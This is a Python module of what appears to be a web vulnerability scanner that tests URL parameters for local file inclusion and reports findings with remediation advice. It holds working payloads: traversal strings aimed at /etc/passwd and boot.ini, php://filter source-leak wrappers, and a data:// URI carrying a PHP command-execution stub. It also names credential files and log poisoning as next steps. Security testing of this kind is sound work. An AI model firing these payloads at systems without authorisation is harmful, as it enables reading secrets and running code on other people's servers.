from __future__ import annotations

import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from .base import BaseScanModule, Finding

# All bypass techniques from CBBH Module 16: File Inclusion
LFI_PAYLOADS = [
    # Direct absolute path
    "../../../../etc/passwd",
    # Non-recursive filter bypass (....// → after strip becomes ../)
    "....//....//....//....//etc/passwd",
    # URL-encoded traversal
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Approved-path bypass prefix
    "./languages/../../../../etc/passwd",
    # Null byte (legacy PHP < 5.5)
    "../../../../etc/passwd%00",
    # Double-encoded
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    # Windows targets
    "..\\..\\..\\..\\Windows\\boot.ini",
    "../../../../Windows/boot.ini",
]

# PHP filter wrapper payloads (CBBH 16: PHP Filters)
PHP_FILTER_PAYLOADS = [
    "php://filter/read=convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=config",
    "php://filter/read=convert.base64-encode/resource=configure",
    "php://filter/read=convert.base64-encode/resource=../config",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==",
]

# Indicators that LFI succeeded
LFI_SUCCESS_PATTERNS = [
    r"root:.*:0:0:",          # /etc/passwd Linux
    r"daemon:.*:/usr/sbin",
    r"\[boot loader\]",       # Windows boot.ini
    r"operating systems",
    r"WINDOWS",
]

# Indicator of base64-encoded PHP source returned
PHP_FILTER_PATTERN = re.compile(r"^[A-Za-z0-9+/]{20,}={0,2}$", re.MULTILINE)


class LFIRFIScanner(BaseScanModule):
    name = "lfi_rfi"
    description = "Test for Local File Inclusion using CBBH bypass techniques and php:// filter wrappers"

    def run(self, url: str) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            findings.append(Finding(
                check="LFI/RFI",
                result="INFO",
                severity="Info",
                evidence=f"No query parameters found in {url} -- LFI testing requires injectable params.",
                detail="Manually test endpoints that accept a file path or page parameter.",
            ))
            return findings

        for param in params:
            # Test standard LFI payloads
            for payload in LFI_PAYLOADS:
                result = self._test_param(url, parsed, params, param, payload)
                if result:
                    findings.append(result)
                    break  # one confirmed LFI per param is enough

            # Test PHP filter wrappers
            for payload in PHP_FILTER_PAYLOADS:
                result = self._test_php_filter(url, parsed, params, param, payload)
                if result:
                    findings.append(result)
                    break

        if not findings:
            findings.append(Finding(
                check="LFI/RFI",
                result="SECURE",
                severity="Info",
                evidence=f"No LFI indicators detected across {len(params)} parameter(s).",
            ))

        return findings

    def _build_url(self, parsed, params: dict, param: str, payload: str) -> str:
        new_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        new_params[param] = payload
        new_query = urlencode(new_params)
        return urlunparse(parsed._replace(query=new_query))

    def _test_param(self, url, parsed, params, param, payload) -> Finding | None:
        test_url = self._build_url(parsed, params, param, payload)
        try:
            resp = requests.get(test_url, timeout=self.timeout, verify=False,
                                allow_redirects=True)
            for pattern in LFI_SUCCESS_PATTERNS:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    snippet = resp.text[:300]
                    return Finding(
                        check="LFI (Local File Inclusion)",
                        result="VULNERABLE",
                        severity="Critical",
                        evidence=f"Parameter '{param}' is vulnerable. Payload: {payload}",
                        detail=(
                            "LFI confirmed -- file contents leaked in response. "
                            "Attacker can read /etc/passwd (usernames), /var/www/html/config.php (DB credentials), "
                            "/.env (API keys), and /var/log/apache2/access.log (for log poisoning → RCE). "
                            "Fix (CBBH): never pass user input directly to include()/file_get_contents(); "
                            "use a whitelist map; set open_basedir=/var/www in php.ini; "
                            "set allow_url_fopen=Off and allow_url_include=Off."
                        ),
                        raw_request=f"GET {test_url}",
                        raw_response=snippet,
                    )
        except requests.RequestException:
            pass
        return None

    def _test_php_filter(self, url, parsed, params, param, payload) -> Finding | None:
        test_url = self._build_url(parsed, params, param, payload)
        try:
            resp = requests.get(test_url, timeout=self.timeout, verify=False,
                                allow_redirects=True)
            body = resp.text.strip()
            # Look for a large base64 blob -- characteristic of php://filter output
            if PHP_FILTER_PATTERN.search(body) and len(body) > 100:
                return Finding(
                    check="LFI via PHP Filter Wrapper",
                    result="VULNERABLE",
                    severity="Critical",
                    evidence=f"Parameter '{param}' returned base64 data with payload: {payload}",
                    detail=(
                        "php://filter wrapper is accessible. Attacker can read PHP source code "
                        "base64-encoded (bypassing PHP execution) to steal DB credentials and discover "
                        "further attack surfaces. Command: echo '<b64>' | base64 -d. "
                        "Fix: set allow_url_include=Off; never pass user input to include()."
                    ),
                    raw_request=f"GET {test_url}",
                    raw_response=body[:300],
                )
        except requests.RequestException:
            pass
        return None
